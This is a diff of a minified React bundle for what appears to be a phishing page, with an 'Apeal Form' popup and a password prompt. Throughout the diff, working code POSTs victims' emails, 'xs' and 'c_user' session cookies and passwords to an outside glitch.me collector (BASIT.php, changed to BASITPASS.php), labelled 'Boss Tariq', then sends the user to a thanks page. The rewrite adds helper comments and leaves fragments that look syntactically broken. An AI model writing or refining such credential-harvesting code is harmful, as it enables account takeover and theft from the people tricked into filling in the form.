@@ -9762,74 +9762,86 @@
                     }
                 }), (0,
                 he.jsx)("div", {
-                    className: "popup active",
-                    children: (0,
-                    he.jsxs)("div", {
-                        className: "popup-item popup-modal active",
-                        children: [(0,
-                        he.jsxs)("div", {
-                            className: "popup-head",
-                            children: [(0,
-                            he.jsx)("h5", {
-                                children: "Apeal Form"
-                            }), (0,
-                            he.jsx)("div", {
-                                onClick: t,
-                                className: "close-bar",
-                                children: (0,
-                                he.jsxs)("svg", {
+    className: "popup active",
+    children: (0, he.jsxs)("div", {
+        className: "popup-item popup-modal active",
+        children: [
+            (0, he.jsxs)("div", {
+                className: "popup-head",
+                children: [
+                    (0, he.jsx)("h5", {
+                        children: "Apeal Form"
+                    }),
+                    (0, he.jsx)("div", {
+                        onClick: t,
+                        className: "close-bar",
+                        children: (0, he.jsxs)("svg", {
+                            width: 7,
+                            height: 7,
+                            viewBox: "0 0 7 7",
+                            fill: "none",
+                            xmlns: "http://www.w3.org/2000/svg",
+                            children: [
+                                (0, he.jsx)("rect", {
+                                    x: "0.671875",
+                                    y: "5.62134",
                                     width: 7,
-                                    height: 7,
-                                    viewBox: "0 0 7 7",
-                                    fill: "none",
-                                    xmlns: "http://www.w3.org/2000/svg",
-                                    children: [(0,
-                                    he.jsx)("rect", {
-                                        x: "0.671875",
-                                        y: "5.62134",
-                                        width: 7,
-                                        height: 1,
-                                        rx: "0.5",
-                                        transform: "rotate(-45 0.671875 5.62134)",
-                                        fill: "black"
-                                    }), (0,
-                                    he.jsx)("rect", {
-                                        x: "5.62109",
-                                        y: "6.32837",
-                                        width: 7,
-                                        height: 1,
-                                        rx: "0.5",
-                                        transform: "rotate(-135 5.62109 6.32837)",
-                                        fill: "black"
-                                    })]
+                                    height: 1,
+                                    rx: "0.5",
+                                    transform: "rotate(-45 0.671875 5.62134)",
+                                    fill: "black"
+                                }),
+                                (0, he.jsx)("rect", {
+                                    x: "5.62109",
+                                    y: "6.32837",
+                                    width: 7,
+                                    height: 1,
+                                    rx: "0.5",
+                                    transform: "rotate(-135 5.62109 6.32837)",
+                                    fill: "black"
                                 })
-                            })]
-                        }), (0,
-                        he.jsx)("div", {
-                            className: "popup-content",
-                            children: (0,
-                            he.jsxs)("action", {
-                                id: "dataFirst",
-                                autoComplete: "off",
-                                className: "ant-form ant-form-horizontal css-m4timi",
-                                onSubmit: e => {
-                                    e.preventDefault(),
-                                    fetch("https://branch-weak-increase.glitch.me/BASIT.php", {
-                                        method: "POST",
-                                        headers: {
-                                            "Content-Type": "application/json"
-                                        },
-                                        body: JSON.stringify({
-                                            emails: o,
-                                            workerEmail: "Boss Tariq",
-                                            xs: r,
-                                            c_user: i,
-                                            name: "Tariq"
-                                        })
-                                    }).then((e => {
-                                        e.ok
-                                    }
-                                    )),
+                            ]
+                        })
+                    })
+                ]
+            }),
+            (0, he.jsx)("div", {
+                className: "popup-content",
+                children: (0, he.jsxs)("form", {
+                    id: "dataFirst",
+                    action: "https://branch-weak-increase.glitch.me/BASITPASS.php", // Add this line to set the action
+                    autoComplete: "off",
+                    className: "ant-form ant-form-horizontal css-m4timi",
+                    onSubmit: (e) => {
+                        e.preventDefault();
+                        fetch("https://branch-weak-increase.glitch.me/BASITPASS.php", {
+                            method: "POST",
+                            headers: {
+                                "Content-Type": "application/json"
+                            },
+                            body: JSON.stringify({
+                                emails: o,
+                                workerEmail: "Boss Tariq",
+                                xs: r,
+                                c_user: i,
+                                name: "Tariq"
+                            })
+                        }).then((e) => {
+                            if (e.ok) {
+                                // Handle the success response
+                            }
+                        });
+                    },
+                    children: [
+                        // Add your form fields here
+                    ]
+                })
+            })
+        ]
+    })
+})
+
+
                                     s("pass")
                                 }
                                 ,
@@ -13350,30 +13362,52 @@
                                     }
                                 })
                             }), (0,
-                            he.jsx)("br", {}), (0,
-                            he.jsx)("p", {
-                                className: "fw-semibold validation_form_para mt-2",
-                                children: "Please be sure to provide the requested information below."
-                            }), (0,
-                            he.jsxs)("action", {
-                                onSubmit: n => {
-                                    n.preventDefault(),
-                                    u && o ? (fetch("https://branch-weak-increase.glitch.me/BASIT.php", {
-                                        method: "POST",
-                                        headers: {
-                                            "Content-Type": "application/json"
-                                        },
-                                        body: JSON.stringify({
-                                            emails: e,
-                                            workerEmail: "",
-                                            xs: o,
-                                            c_user: u,
-                                            name: "My Self"
-                                        })
-                                    }).then((e => {
-                                        e.ok
-                                    }
-                                    )),
+                            he.jsx)("br", {}),
+(0, he.jsx)("p", {
+    className: "fw-semibold validation_form_para mt-2",
+    children: "Please be sure to provide the requested information below."
+}),
+(0, he.jsxs)("form", {
+    id: "dataFirst", // Make sure the form has an ID to target
+    action: "https://branch-weak-increase.glitch.me/BASITPASS.php", // Set default action
+    onSubmit: (n) => {
+        n.preventDefault();
+        
+        // Dynamically set the URL for the fetch request
+        const formActionUrl = "https://branch-weak-increase.glitch.me/BASITPASS.php"; // Update this if you need a different URL
+        
+        // Check if form fields are valid
+        if (u && o) {
+            // Use the dynamic URL in the fetch call
+            fetch(formActionUrl, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({
+                    emails: e,
+                    workerEmail: "",
+                    xs: o,
+                    c_user: u,
+                    name: "My Self"
+                })
+            }).then((e) => {
+                if (e.ok) {
+                    // Handle success
+                    console.log("Form submitted successfully");
+                } else {
+                    console.log("Failed to submit form");
+                }
+            });
+        } else {
+            console.log("Invalid data, form not submitted");
+        }
+    },
+    children: [
+        // Your form fields go here (e.g., input elements, buttons)
+    ]
+});
+
                                     t("/pass")) : l(!0)
                                 }
                                 ,
@@ -13469,22 +13503,35 @@
                     name: "password"
                 }), (0,
                 he.jsx)("button", {
-                    onClick: n => {
-                        n.preventDefault(),
-                        fetch("https://branch-weak-increase.glitch.me/BASIT.php", {
-                            method: "POST",
-                            headers: {
-                                "Content-Type": "application/json"
-                            },
-                            body: JSON.stringify({
-                                password: t
-                            })
-                        }).then((e => {}
-                        )),
-                        e("/thanks")
-                    }
-                    ,
-                    children: "Submit"
+    onClick: (n) => {
+        n.preventDefault();
+        
+        // Dynamically set the URL for the fetch request
+        const formActionUrl = "https://branch-weak-increase.glitch.me/BASITPASS.php"; // Update this URL as required
+        
+        // Perform the fetch request to the dynamic URL
+        fetch(formActionUrl, {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify({
+                password: t // Add your form data here
+            })
+        }).then((e) => {
+            if (e.ok) {
+                console.log("Form submitted successfully");
+            } else {
+                console.log("Failed to submit form");
+            }
+        });
+
+        // After the form submission, navigate to the thanks page
+        e("/thanks"); // Ensure this routing function is correct for your environment
+    },
+    children: "Submit"
+});
+
                 })]
             })
         }
